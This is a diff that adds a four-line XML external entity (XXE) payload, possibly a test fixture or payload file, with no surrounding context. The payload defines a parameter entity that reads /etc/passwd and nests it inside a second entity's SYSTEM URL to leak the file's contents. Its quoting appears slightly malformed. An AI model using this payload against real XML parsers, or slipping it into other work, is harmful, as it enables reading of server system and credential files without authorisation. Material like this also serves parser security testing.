@@ -1,0 +1,4 @@
+<!ENTITY % payload SYSTEM "file:///etc/passwd">
+<!ENTITY % param1 "<!ENTITY &#x25; external SYSTEM "_://%payload;">'>
+%param1;
+%external;
